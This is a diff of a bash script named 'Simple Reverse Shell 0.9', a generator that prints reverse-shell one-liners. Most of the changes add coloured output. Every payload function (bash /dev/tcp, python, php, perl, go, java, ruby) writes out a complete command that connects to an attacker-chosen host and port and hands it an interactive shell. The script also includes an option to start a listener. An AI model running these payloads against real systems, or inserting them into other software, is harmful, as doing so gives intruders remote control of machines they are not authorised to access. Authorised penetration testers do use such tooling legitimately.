@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
-#Simple Reverse Shell 0.9 : Reverse shell payload generator
+#Simple Reverse Shell 0.9 : Reverse shell code generator
 #Author : Martin Kubecka
 
 #Colors
@@ -10,6 +10,7 @@ green='\033[0;32m'
 bg_green='\033[0;42m'
 bold_red='\e[1;31;40m'
 red_bg_gray='\e[1;31;47m'
+bold_yellow='\e[1;33;40m'
 
 echo -e "${flashing_red_bg_yellow} --- Simple Reverse Shell Generator --- ${clear}"
 #echo -e "${flashing_red}python :: php :: java :: bash :: ruby :: perl :: netcat${clear}"
@@ -17,9 +18,9 @@ echo -e "${flashing_red_bg_yellow} --- Simple Reverse Shell Generator --- ${clea
 usage() {
 cat << EOF
 
-Usage: $0 [-h|l|u] -i param_value -p param_value -t param_value
+Usage: $0 [-h|l|u] -i <LHOST> -p <LPORT> -t <PAYLOAD>
 
-Simple reverse shell payload generator
+Simple Reverse Shell Generator
 
 Available options:
 
@@ -40,41 +41,41 @@ EOF
  
 bash() {
 	printf "\n${green}[+]${clear} ${bg_green}BASH${clear}\n\n"
-	printf "bash -i >& /dev/tcp/$lhost/$lport 0>&1\n\n"
-	printf "0<&196;exec 196<>/dev/tcp/$lhost/$lport; sh <&196 >&196 2>&196\n\n"
+	printf "${bold_yellow}bash -i >& /dev/tcp/$lhost/$lport 0>&1${clear}\n\n"
+	printf "${bold_yellow}0<&196;exec 196<>/dev/tcp/$lhost/$lport; sh <&196 >&196 2>&196${clear}\n\n"
 }    
 
 python() {
 	printf "\n${green}[+]${clear} ${bg_green}PYTHON${clear}\n\n"
-	printf "python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")\'\n\n"
+	printf "${bold_yellow}python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")\'${clear}\n\n"
 }
 
 php() {
 	printf "\n${green}[+]${clear} ${bg_green}PHP${clear}\n\n"
-	printf "php -r \'\$sock=fsockopen(\"$lhost\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");\'\n\n"
+	printf "${bold_yellow}php -r \'\$sock=fsockopen(\"$lhost\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");\'${clear}\n\n"
 }
 
 perl() {
 	printf "\n${green}[+]${clear} ${bg_green}PERL${clear}\n\n"
-	printf "perl -e \'use Socket;\$i=\"$lhost\";\$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};\'\n\n"
+	printf "${bold_yellow}perl -e \'use Socket;\$i=\"$lhost\";\$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};\'${clear}\n\n"
 	printf ""
 }
 
 go() {
 	printf "\n${green}[+]${clear} ${bg_green}GO${clear}\n\n"
-	printf "echo \'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"$lhost:$lport\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go\n\n"
+	printf "${bold_yellow}echo \'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"$lhost:$lport\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go${clear}\n\n"
 }
 
 java() {
 	printf "\n${green}[+]${clear} ${bg_green}JAVA${clear}\n\n"
-	printf "Runtime r = Runtime.getRuntime();\n"
-	printf "Process p = r.exec(\"/bin/bash -c \'exec 5<>/dev/tcp/$lhost/$lport;cat <&5 | while read line; do \$line 2>&5 >&5; done\'\");\n"
-	printf "p.waitFor();\n\n"
+	printf "${bold_yellow}Runtime r = Runtime.getRuntime();${clear}\n"
+	printf "${bold_yellow}Process p = r.exec(\"/bin/bash -c \'exec 5<>/dev/tcp/$lhost/$lport;cat <&5 | while read line; do \$line 2>&5 >&5; done\'\");${clear}\n"
+	printf "${bold_yellow}p.waitFor();${clear}\n\n"
 }
 
 ruby() {
 	printf "\n${green}[+]${clear} ${bg_green}RUBY${clear}\n\n"
-	printf "ruby -rsocket -e\'f=TCPSocket.open(\"$lhost\",$lport).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)\'\n\n"
+	printf "${bold_yellow}ruby -rsocket -e\'f=TCPSocket.open(\"$lhost\",$lport).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)\'${clear}\n\n"
 }
 
 listener() {
@@ -163,7 +164,7 @@ case $type in
   *)
     printf "\n\n${bold_red}[!] Invalid payload type option.${clear}\n\n"
     ;;
-
+    
 esac
 
 if $activate_listener ; then
